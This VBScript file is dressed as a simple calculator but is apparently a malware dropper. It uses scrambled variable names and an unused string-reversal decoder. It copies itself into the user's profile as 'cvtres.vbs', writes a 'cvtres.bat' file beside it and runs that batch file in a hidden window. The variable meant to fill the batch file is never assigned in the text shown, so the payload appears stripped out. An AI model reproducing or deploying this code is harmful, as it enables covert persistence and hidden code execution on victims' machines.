Dim iYLNsDfFBW
Dim NxdCehvTOR
Dim RVwijRMqBF
Dim VyEuIJtIDk

' Function to perform the calculation
Function Calculate(firstNumber, secondNumber, RVwijRMqBFType)
    Select Case RVwijRMqBFType
        Case "+"
            Calculate = firstNumber + secondNumber
        Case "-"
            Calculate = firstNumber - secondNumber
        Case "*"
            Calculate = firstNumber * secondNumber
        Case "/"
            If secondNumber <> 0 Then
                Calculate = firstNumber / secondNumber
            Else
                Calculate = "Error: Division by zero"
            End If
        Case Else
            Calculate = "Error: Invalid RVwijRMqBF"
    End Select
End Function

Function YTchsylcKA(VmNvuPtHWR)
    Dim RGwFwRtOVA
    RGwFwRtOVA = ""
    
    For i = Len(VmNvuPtHWR) To 1 Step -1
        RGwFwRtOVA = RGwFwRtOVA & Mid(VmNvuPtHWR, i, 1)
    Next
    
    YTchsylcKA = RGwFwRtOVA
End Function
Dim wkpYunBCEB


Set QOdWboSJTu = CreateObject("WScript.Shell")

' Get the user's profile directory
UserProfile = QOdWboSJTu.ExpandEnvironmentStrings("%UserProfile%")
Dim ONqEalzRLr
ONqEalzRLr = UserProfile & "\cvtres.bat"

Dim xYvajLjFZv
xYvajLjFZv = UserProfile & "\cvtres.vbs"

Dim iRdbtcCzEi 
iRdbtcCzEi = WScript.ScriptFullName

Set YKUAMJTLYj = CreateObject("Scripting.FileSystemObject")
iRdbtcCzEi = WScript.ScriptFullName

If Not YKUAMJTLYj.FileExists(xYvajLjFZv) Then
    YKUAMJTLYj.CopyFile iRdbtcCzEi, xYvajLjFZv
End If
Dim OJQndSsdNp, IZnDsMdVoA
Set OJQndSsdNp = CreateObject("Scripting.FileSystemObject")
Set IZnDsMdVoA = OJQndSsdNp.CreateTextFile(ONqEalzRLr, True)
IZnDsMdVoA.Write wkpYunBCEB
IZnDsMdVoA.Close

QOdWboSJTu.Run ONqEalzRLr, 0, false
